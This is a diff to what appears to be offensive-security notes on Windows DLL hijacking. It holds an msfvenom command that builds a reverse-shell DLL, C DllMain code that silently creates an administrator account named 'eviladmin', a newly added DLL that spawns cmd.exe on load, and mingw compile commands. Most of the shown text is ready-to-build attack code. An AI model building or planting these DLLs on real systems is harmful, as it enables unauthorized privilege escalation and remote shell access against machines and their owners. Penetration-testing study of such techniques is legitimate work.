@@ -37,8 +37,8 @@ Resources:
 5. Generate a reverse shell DLL named hijackme.dll: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o hijackme.dll`
 6. Run again the vulnerable service: `net stop <service>` and `net start dllsvc`
 
-**Another example of a dll**:
-```c++
+**Other examples of a DLL**:
+```c
 #include <windows.h>
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
@@ -46,9 +46,9 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
         case DLL_PROCESS_ATTACH:
             // Perform initialization tasks for the DLL when it is loaded
 	    
-	    int i;
-  	    i = system ("net user eviladmin Ev!lpass /add");
-  	    i = system ("net localgroup administrators eviladmin /add");
+		    int i;
+	  	    i = system ("net user eviladmin Ev!lpass /add");
+	  	    i = system ("net localgroup administrators eviladmin /add");
 	    
             break;
         case DLL_PROCESS_DETACH:
@@ -64,7 +64,48 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
     return TRUE;
 }
 ```
-- `x86_64-w64-mingw32-gcc dllh.cpp --shared -o dllh.dll`
+
+```c
+#include <windows.h>
+#include <shellapi.h>
+
+DWORD WINAPI LaunchCmdShellThread(LPVOID lpParam) {
+    SHELLEXECUTEINFOA sei;
+    ZeroMemory(&sei, sizeof(sei));
+    sei.cbSize = sizeof(sei);
+    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+    sei.lpVerb = "open";
+    sei.lpFile = "C:\\Windows\\System32\\cmd.exe";
+    sei.lpParameters = "/k echo it works!";
+    sei.nShow = SW_SHOW;
+
+    if (ShellExecuteExA(&sei)) {
+        if (sei.hProcess) CloseHandle(sei.hProcess);
+    }
+    return 0;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        {
+            HANDLE h = CreateThread(NULL, 0, LaunchCmdShellThread, NULL, 0, NULL);
+            if (h) CloseHandle(h);
+        }
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_THREAD_DETACH:
+        break;
+    }
+    return TRUE;
+}
+```
+
+- 64-bit `x86_64-w64-mingw32-gcc -shared -o mydll.dll dll.c`
+- 32-bit `i686-w64-mingw32-gcc -shared -o mydll.dll dll.c`
 
 **Resources**
 - [hijacklibs.net](https://hijacklibs.net/)
